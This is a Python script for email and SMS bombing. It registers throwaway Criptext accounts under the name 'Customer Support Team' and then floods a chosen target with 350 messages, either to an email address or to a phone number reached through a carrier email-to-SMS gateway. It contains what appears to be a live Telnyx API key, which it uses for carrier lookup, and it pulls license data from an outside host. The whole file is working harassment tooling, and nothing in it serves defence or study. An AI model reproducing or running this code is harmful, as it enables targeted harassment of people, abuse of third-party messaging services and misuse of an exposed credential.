import requests
import json
import os
import time

def register():
    with requests.Session() as sess:
        global r
        url = "https://api.criptext.com/user"
        content = '{\"name\":\"Customer Support Team\",\"password\":\"EnjaktcGL7Hig3soU1mCPfMekhy50lUd03cXjGHpqI8=\",\"recipientId\":\"lmao'+str(namegen)+'\",\"keybundle\":{\"registrationId\":5511,\"signedPreKeyId\":49,\"signedPreKeyPublic\":\"BXfYf7VBxqWPQ2gC2iXdAMI5Ak\\/49psG+Q8H3Ceh\\/z1V\",\"identityPublicKey\":\"BQvTR7HQQvPmOhXxvZvqGejuhcri3aOgdrO23AcZQfZ+\",\"signedPreKeySignature\":\"iIdf+uOGcz8CmRXTWodEZbrgDBtzciaKFNm2O8\\/3WlTSPl\\/cIbC6iM1ep+gRF8lkLdNBV2+Tt5s9R2kEbFo9Bw==\",\"preKeys\":[{\"id\":1,\"publicKey\":\"BWnWg2hKMjJIEVthYlPIvXG4uScanREPCZFQCfKlRDt2\"},{\"id\":2,\"publicKey\":\"BThMDrNJho1Xr+P1ak\\/U1AQMfFWwRDIyWnBLD+pric44\"},{\"id\":3,\"publicKey\":\"Beogxs1Uk76Vpq0jixbf4APBoF7YrzI80IL\\/7YUzM4Fe\"},{\"id\":4,\"publicKey\":\"BfsVuXAGg2a0rb0tqHdt084yN4IF5E+M4j9Si5vb2EcV\"},{\"id\":5,\"publicKey\":\"BU\\/FgxmTX4faQYXjAeRJJmtsrM7WbZiQHYcakF3sAdA7\"},{\"id\":6,\"publicKey\":\"BeTCRpvKaoj00s01wBI16+8YmZQgS59zxeDWmrGhG1d0\"},{\"id\":7,\"publicKey\":\"BYTulZgT5Tq4fQDSqXW7JhZeXeVAz7Drf\\/gVHLlcQClj\"},{\"id\":8,\"publicKey\":\"BR69Qy1zFGxgr6j5G2Wd+MGyNepQkgVOseAQ2IR+jZha\"},{\"id\":9,\"publicKey\":\"BaX7xj1T1LgRM8iDEgIbuCl7VbYYERgTWpvYw1Jp8I8s\"},{\"id\":10,\"publicKey\":\"BYcddzdNcvaxpIKIq3oktJlSYuTXDzA9Z7SkCDq3dy9A\"},{\"id\":11,\"publicKey\":\"Bfe\\/Y9utYJ+UWTk7mvyYV7qknyLaV0Id7zInlGXD0345\"},{\"id\":12,\"publicKey\":\"BSKo2+imqE+IdU7Gz7ea6NP2KVlUI\\/MuZrNRzPqpcTEl\"},{\"id\":13,\"publicKey\":\"BXucCljioTj20KnhJwmX1tNB8IOQlrPnVUV2OXi8GIRs\"},{\"id\":14,\"publicKey\":\"Bdq0tYBqgdDM2f\\/gZd3ub4SkmwCjA9\\/BGamozZfmcQUf\"},{\"id\":15,\"publicKey\":\"Beg4X0mpdKLWbFYGpoZFxS8rL+CDh4qRgnpc3EqESEtc\"},{\"id\":16,\"publicKey\":\"BZww\\/QTI4HuMnrJBkdAh2f7KZN6r2kHae4mahKAkT5w+\"},{\"id\":17,\"publicKey\":\"BWcBc2xxlHtEvedeTsTTXLnuTvb9tfTT\\/sR\\/WSEqKJRG\"},{\"id\":18,\"publicKey\":\"BRgkQXFjT9QOoKYyncTM5RL4xLhsAzl9bneUMj8cfJcy\"},{\"id\":19,\"publicKey\":\"BTaMy+QNpW\\/gfEp0wdDF0xijq0EZI+CmFJ+npAeVsUxm\"},{\"id\":20,\"publicKey\":\"BdSWl7qwmTX6TQzeB37Ol8tBGklS2zVvbRJVFBcU+ltp\"},{\"id\":21,\"publicKey\":\"BSqKu+5z0mpWE68tTinm6CVcgHasnArv35VANjpRmShi\"},{\"id\":22,\"publicKey\":\"BaD1M3f3+GAOUBJOHKHMEf56+3tUjMGh6Faa79OLyEhq\"},{\"id\":23,\"publicKey\":\"Bbu1xelE50vKFQRYl6cTG5lwWLT56X21TEi4AsZYiuBx\"},{\"id\":24,\"publicKey\":\"BUSmEZdqKXt0OQDz4nLh\\/tv+Zk4XXytzLmJqhA+wvEpN\"},{\"id\":25,\"publicKey\":\"BTQ0nQda9n1dz42baAkq3lJwZrdfk+S6mGrK4+VwBK1a\"},{\"id\":26,\"publicKey\":\"BZef3udcjm3B9+n3kW43bc6ggACnMMLGK1WTX\\/S9Qc44\"},{\"id\":27,\"publicKey\":\"BeeDy32N\\/DslhC5PCGNg9wtyE\\/44QippHu9QJM\\/DPkZw\"},{\"id\":28,\"publicKey\":\"Bc5pTBMdtmgkYoDz38qPWb9a2RmFlqLMlMJozjiZKCZG\"},{\"id\":29,\"publicKey\":\"BXBmEP9iWas49i6S+wDL606w7fhow8hsZy65FmsiRUYQ\"},{\"id\":30,\"publicKey\":\"BTDunQC5xaxxIt6UxF5NR1qA71JiUKMz3eplrocGZC10\"},{\"id\":31,\"publicKey\":\"BYyE7iF4JCBD+zq\\/gOi3QDk4MTFEKT+X8asDviI9XItD\"},{\"id\":32,\"publicKey\":\"Bck1o6IJUUXS+sZdIF9C3sXLr71ZJtS6vuKEmploCcds\"},{\"id\":33,\"publicKey\":\"Bdba1L8yH82r882hrhd0VoOaePFnuXY7UXqoQw7AG4No\"},{\"id\":34,\"publicKey\":\"BaidGQT9AooYS4Op0\\/zTqYcZuSS58ZKESESBbdBUGLNV\"},{\"id\":35,\"publicKey\":\"Beg0s87TvAzclTUSfxryCP26HjnJdgGErPEuAuM5BVZW\"},{\"id\":36,\"publicKey\":\"BcE6eL0QJ2G2cOtc2geUkie+lZNv7b\\/rLGjoD3x5K50T\"},{\"id\":37,\"publicKey\":\"BYATGoIHA+XvDma7BUhydNK0nkDEpySwWQovS8S5a8cc\"},{\"id\":38,\"publicKey\":\"BZuEj80i0MIS1vHBgDvDlS8IqxCwO3poFqbeeVPMt4oc\"},{\"id\":39,\"publicKey\":\"Bd4prBARRCdOqvxFSPjtipzaLZ0CU6uvFTpS11\\/c\\/mt9\"},{\"id\":40,\"publicKey\":\"BY2u8gUixFdFBWTMEbdLd6z0VFQOzowkdG1hnqonVIgD\"},{\"id\":41,\"publicKey\":\"BSU4srUjqc4CJDIghGFIUntnSHDzIu+VNJO2AtAwKb9J\"},{\"id\":42,\"publicKey\":\"BbN0zGk4DuLNpEPOU7FKHTj6V0yDi+RNRMmLE7Vj2QZy\"},{\"id\":43,\"publicKey\":\"BSdF86pEY1fI4n5JZrHnUAipttomhyyhPV2mstb6teEJ\"},{\"id\":44,\"publicKey\":\"BaV9VXMnj1w3exUu9z98EVYL\\/O9hXw7rrxFyFOVhfqQw\"},{\"id\":45,\"publicKey\":\"Ba6clClGzIK3yo13YxZHebFzxXFsNiu09+A1aifRTXNq\"},{\"id\":46,\"publicKey\":\"BRCB4cdjzcjEkJtlH2rLQoh1iODu3XwJ9V722kGK+P0r\"},{\"id\":47,\"publicKey\":\"Bam88jmKDRsLTjDicvOztXhTaDwdPfvcBN+5uNrjJ6ci\"},{\"id\":48,\"publicKey\":\"BSEbSUSSAd3zhpIZjZdYJXBBYtk4h4rD4flPjlRz3k0h\"},{\"id\":49,\"publicKey\":\"BVIatkgOZC7vDtFIs2jOI+yiboK8wcSk+TACt\\/LSE24N\"},{\"id\":50,\"publicKey\":\"BT6E+25cn+JQXcujx0G1nULAiL9wKatFC0EQ0GWxwCMF\"},{\"id\":51,\"publicKey\":\"BXINaQVS4E1agaqDIneZXTvnLBBHOeeEKAGk5EHQ7\\/c\\/\"},{\"id\":52,\"publicKey\":\"BTv6s32lc09VXT4hUOzW2oyrTZvImC81ll9WmGOL3902\"},{\"id\":53,\"publicKey\":\"BdpcVM\\/kIw+3bijxr+hxrLmvXDNopL\\/yF6DWgDWxENh2\"},{\"id\":54,\"publicKey\":\"BXlQXvPkicXw\\/NH4Ef0BV0iDt2nTHHQN5Cbj1iW\\/c4FY\"},{\"id\":55,\"publicKey\":\"Bcp1+nxPcnnvp+C+04Zb5ncEL6GsViZgvjVre9aVUOoG\"},{\"id\":56,\"publicKey\":\"Ba7bqR3UsKrAdXEtr70G4ST3U9WNcQyGqoZuqbSCutRY\"},{\"id\":57,\"publicKey\":\"BZ0zb1+H9gw92TlvezPOJPaYdJhGnVXUF8SZOtW+4nk+\"},{\"id\":58,\"publicKey\":\"BVtjlnrwM4XL7Yo6VKlHNxJe9qbCMah85lHFvdNct2wB\"},{\"id\":59,\"publicKey\":\"BZCMx5RZHKS4Y+cipKQgHgmURN5O7sQfCbeYO8q4EFZ8\"},{\"id\":60,\"publicKey\":\"BYoa1uEJmH4UjvGaO8th+BfKNasWxsfgKWLh0fdWo39j\"},{\"id\":61,\"publicKey\":\"BSbKmm\\/+D4fq8KgirpX2sIrjMr6rTY\\/+rTKZ45pYbAp8\"},{\"id\":62,\"publicKey\":\"BYUMpuawTUONQKBdXTp5+DWsL4VPB5tj3c3AFw\\/PU0Ie\"},{\"id\":63,\"publicKey\":\"BbTuIG\\/u3yc8dnhrbhjpjdJj+wvN5cYPpNtQW3yGgrAE\"},{\"id\":64,\"publicKey\":\"BRh4qHmwucYaA21xEuZ\\/ci1hvy6ve9rRlQewXU79FcVC\"},{\"id\":65,\"publicKey\":\"BeQs37xfk8asnnQPj7gZcfYBjvTmM\\/xKNUZ\\/sNMMrBNt\"},{\"id\":66,\"publicKey\":\"BdJSiLYYVhwna+kwkJP7QxTzsil+KfGJqpj9DxHbnQQM\"},{\"id\":67,\"publicKey\":\"BRSZDQa1A1v8u3lo0f0nshobaQGFazL0exy0vLXgbPhr\"},{\"id\":68,\"publicKey\":\"BekUVcQbQnEaElXrKRHAokXxAuXcXMWnlSsh\\/lIbn9BQ\"},{\"id\":69,\"publicKey\":\"BVD5OxZePX192JgVeyNCdlCDefl\\/dcfHvhyNMlW8bx0i\"},{\"id\":70,\"publicKey\":\"BTbqfMMFrcPefDyeuCC7ifkH85BSncvl2+U9GlS8pQwn\"},{\"id\":71,\"publicKey\":\"BQ9JkEuf\\/FimXzd4\\/slfEtPwT3JIciUR2rMdQbU\\/HRg0\"},{\"id\":72,\"publicKey\":\"BWkwuXGDgCUphxOuTH+6QDBHcOcScf04abRPlQskmWU\\/\"},{\"id\":73,\"publicKey\":\"BdQoYkHEW6fUWusddRA67WtVheHO2UmvTA0w8b5O0mt4\"},{\"id\":74,\"publicKey\":\"Bb\\/MmU6\\/2SST3Z+vWUHG65BBJVDQIGB\\/HpUPyz5qAhRe\"},{\"id\":75,\"publicKey\":\"BQ2F5l6EnKzKW6lqYCFc1RFrwVMCiHzbl5DMFilGissg\"},{\"id\":76,\"publicKey\":\"Bf6RSuZrslfuQ+dl5a9AdExT0agcmVxKfZE+ms2Yv09\\/\"},{\"id\":77,\"publicKey\":\"BQteaev2B2I3hiz6t\\/WE54oFclEzQnnDD6mNZ\\/i1Pfhp\"},{\"id\":78,\"publicKey\":\"BSZaV8Wl2SSe9J+wg8h6uz5RCbCNMTmFm479udLA5CQh\"},{\"id\":79,\"publicKey\":\"BVEYtuaFYujf2qpsVV\\/9O2DEsQVw7Js7\\/EEHzfBuZXso\"},{\"id\":80,\"publicKey\":\"BS1S+86Hyh6ZBMyiJcKT0SC4ByE1KZBgS72jhu1y9OgZ\"},{\"id\":81,\"publicKey\":\"Bb3XrOMCE9dl3uL\\/qtbZVw0zwGXohmax2i8rxCzDVR98\"},{\"id\":82,\"publicKey\":\"BRGK4qY0nMRfJyfB07pkLT3nyUDo5rnhjGJs2VNMsdw9\"},{\"id\":83,\"publicKey\":\"BTf\\/aUyZBXk+ooFL3DbR5lTz0yRdp1WmiouRSVEu16xa\"},{\"id\":84,\"publicKey\":\"BUd\\/05CckEtKCiV5Z++WB4yOYZx7qimNFg3jb+ArXXZF\"},{\"id\":85,\"publicKey\":\"Be2JTAhXBtZr+ZcrBNlopSc5UNmQHQKPVX7hhTusRKly\"},{\"id\":86,\"publicKey\":\"BVZhBLQ98Z+fRkEcMQjWiWnlvnWdObOc6Ga8jQ+CNnEY\"},{\"id\":87,\"publicKey\":\"BagcyVx9p\\/MmPLh3S7adGI3SIXn9CnuDZKAPicY0nTss\"},{\"id\":88,\"publicKey\":\"BdpojG9\\/kvBsBM1hx5jFmuFaADQeGdepP7JyBu+lLBBP\"},{\"id\":89,\"publicKey\":\"Bad+BZOWd5dBZPnit6TUFFc6CePB90k79Drd+uA20ZEB\"},{\"id\":90,\"publicKey\":\"BSM7PgLp70hEz9kV2wU9wsmIjED8PmMkANFl0YFAE1Aj\"},{\"id\":91,\"publicKey\":\"BadTBWC0znGQO+AQqB0ns+R2KDtB3z5b5a7oRc5oPVVE\"},{\"id\":92,\"publicKey\":\"BZs3vd4fJ5vC3mJJ2i5lflPdLQEdV8kMtgCcTnVVtVF3\"},{\"id\":93,\"publicKey\":\"BWkSMh0thZ1VN1ygkPpFpH0tTr4Q6rFHtQcnZqxh5ONZ\"},{\"id\":94,\"publicKey\":\"BYhzx6XF4f6DTGxaiy0Eho0DAKThrQTRz1bOlqRZEQs2\"},{\"id\":95,\"publicKey\":\"BXGhzY5\\/WxiftobNdjExjDXr4D0GBF2PpEsX\\/3I41Zc\\/\"},{\"id\":96,\"publicKey\":\"BexB5+jtvN8+iJ7E7yAu8QH4itnhokaG+1kP\\/1NWuIlR\"},{\"id\":97,\"publicKey\":\"BSavD7ynnK0bU++8YwclIf4E+HKBPKtn4ESzOyPDfU98\"},{\"id\":98,\"publicKey\":\"BRnXdYJmV9zr1vZ6MHoNMR0BEoxCAiES2ujHYnikAR0D\"},{\"id\":99,\"publicKey\":\"BSfzT8GMxl0ybE33bLqfyUxdS45JRvq6Qoi5bp8nRppm\"},{\"id\":100,\"publicKey\":\"BaDNpjGkBCOkNAHkLj+1CIoKY0TKz\\/aAH67wel+406JW\"}],\"deviceName\":\"Samsung SM-G955N\",\"deviceFriendlyName\":\"Samsung SM-G955N\",\"deviceType\":3},\"recoveryEmail\":\"'+str(recoveryMail)+'\"}'
        headers = {
            "criptext-api-version": "11.0.0",
                "Accept-Language": "en_us",
                    "App-Version": "0.23.4",
                        "OS": "Samsung SM-G955N Android 5.1.1 (API 22)",
                            "Content-Type": "application/json; charset=utf-8",
                                "Content-Length": "7501",
                                    "Host": "api.criptext.com",
                                        "Connection": "Keep-Alive",
                                            "Accept-Encoding": "gzip",
                                                "User-Agent": "okhttp/3.10.0"
        }
        r = sess.post(url, headers=headers, data=content)
        global authToken
        authToken = r.text.split('"token":"')[1]
        authToken = authToken.split('","r')[0]
        return authToken
def startUp():
    typeAttack =  input("Email or SMS Attack [E/S]:  ")
    if  typeAttack == "E":
        clear()
        print("Email Bomb Selected")
        global sentMail
        sentMail  = 0
        time.sleep(1)
        clear()
        global targetMail
        targetMail = input("Enter Target Email: ")
        clear()
        print("Email: "+str(targetMail)+" Loaded Into Barrel -- Ready for Fire.")
        time.sleep(1)
        print("Time for the real show ;)")
        time.sleep(1)
        clear()
        global type2
        type2 = 2
        return targetMail
    
    elif typeAttack == "S":
        clear()
        print("SMS Bomb Selected")
        global sentSMS
        sentSMS  = 0
        time.sleep(1)
        clear()
        global targetNumber
        targetNumber = input("Enter Target Number: ")
        clear()
        print("Email: "+str(targetNumber)+" Loaded Into Barrel -- Checking Carrier Details...")
        time.sleep(1)
        clear()
        apiKey = "KEY0173F11C6B63CF4DA8DCA6D893E85BD2_gcTiiuXRq2RzTMU2hvs5iG"
        with requests.Session() as sess:
            url = "https://api.telnyx.com/v2/number_lookup/+1"+str(targetNumber)+"?type=carrier&type=caller-name"
            headers = {
                "Authorization": "Bearer "+str(apiKey),
                "Accept": "application/json",
                    "Content-Type": "application/json",
                    }
            r = sess.get(url, headers=headers)
            global carrier
            if "VERIZON" in r.text:
                print("Verizon Detected")
                carrier = "@vtext.com"
            elif "CELLCO" in r.text:
                print("Verizon Detected")
                carrier = "@vtext.com"
            elif "Cingular" in r.text:
                print("AT&T Detected")
                carrier = "@txt.att.net"
            elif "CINGULAR" in r.text:
                print("AT&T Detected")
                carrier = "@txt.att.net"
            elif "T-Mobile" in r.text:
                print("T-Mobile Detected")
                carrier = "@tmomail.net"
            elif "Sprint" in r.text:
                print("Sprint Detected")
                carrier = "@messaging.sprintpcs.com"
            elif "SPECTRUM" in r.text:
                print("Sprint Detected")
                carrier = "@messaging.sprintpcs.com"
            time.sleep(2)
            print("Time to Fire... ;)")
        global type
        type = 1
        clear()
def clear():
    os.system("clear")
def authenticated():
    recoYesNo =  input("Do you already have a token? [Y/N]: ")
    if recoYesNo  == "N":
        global recoveryMail
        recoveryMail = input("Enter Token  Registration  Email (temp-mail.org): ")
        register()
        clear()
        confirmationComplete = input("Token Registration Confirmation Sent to Mail. Type [Y] Once Confirmed: ")
        if confirmationComplete == "Y":
            print("Registration Complete --  Time to Bomb ;)")
            time.sleep(1)
            os.system("clear")
            startUp()
    elif recoYesNo  == "Y":
        authToken  = input("Please Provide the Token: ")
        clear()
        print("Auth Token Accepted")
        time.sleep(1)
        clear()
        startUp()
    else:
        print("Invalid Response Recieved")
        time.sleep(0.5)
        os.system("clear")
        authenticated()

def authenticate():
    with requests.Session() as sess:
        global r
        url = "http://starbucks.gg/auth.php"
        headers = {
            "User-Agent": "okhttp/3.10.0"
        }
        r = sess.get(url, headers=headers)
    x  = r.text
    y = json.loads(x)
    license = (y["license"])
    global namegen, contentBody
    namegen = (y["str1"])
    contentBody = (y["str2"])
    if license == "DESYRE389320":
        print("Auth Success")
        authenticated()
        time.sleep(3)
    else:
        print("Auth Failed  - License Revoked")
        authfail()




def mailBomb():
    with requests.Session() as sess:
        global r
        '''
        proxyz = random.choice(proxylist)
        proxies = {'https': 'https://' + proxyz, 'http': 'http://' + proxyz}
        sess.proxies = proxies
        '''
        url = "http://api.criptext.com/email"
        content = '{"subject":"'+str(namegen)+'","criptextEmails":[],"guestEmail":{"to":["'+str(targetMail)+'"],"cc":[],"bcc":[],"body":"'+str(contentBody)+'"}}'
        headers = {
            "Authorization": "Bearer "+str(authToken),
            "criptext-api-version": "11.0.0",
            "Accept-Language": "en_us",
            "App-Version": "0.23.4",
            "OS": "Samsung SM-G955N Android 5.1.1 (API 22)",
            "Content-Type": "application/json",
            "Content-Length": "180",
            "Host": "api.criptext.com",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip",
            "User-Agent": "okhttp/3.10.0",
        }
        r = sess.post(url, headers=headers, data=content, verify=False)

def smsBomb():
    with requests.Session() as sess:
        global r
        '''
            proxyz = random.choice(proxylist)
            proxies = {'https': 'https://' + proxyz, 'http': 'http://' + proxyz}
            sess.proxies = proxies
            '''
        url = "http://api.criptext.com/email"
        content = '{"subject":"'+str(namegen)+'","criptextEmails":[],"guestEmail":{"to":["'+str(targetNumber)+str(carrier)+'"],"cc":[],"bcc":[],"body":"'+str(contentBody)+'"}}'
        headers = {
            "Authorization": "Bearer "+str(authToken),
            "criptext-api-version": "11.0.0",
            "Accept-Language": "en_us",
            "App-Version": "0.23.4",
            "OS": "Samsung SM-G955N Android 5.1.1 (API 22)",
            "Content-Type": "application/json",
            "Content-Length": "180",
            "Host": "api.criptext.com",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip",
            "User-Agent": "okhttp/3.10.0",
        }
        r = sess.post(url, headers=headers, data=content, verify=False)


clear()
authenticate()
if type == 1:
    for i in range(350):
        smsBomb()
        sentSMS+=1
        clear()
        print("Sent Count: "+str(sentSMS))
        time.sleep(0.5)
elif type2 == 2:
    for i in range(350):
        mailBomb()
        sentMail+=1
        clear()
        print("Sent Count: "+str(sentMail))
        time.sleep(0.5)
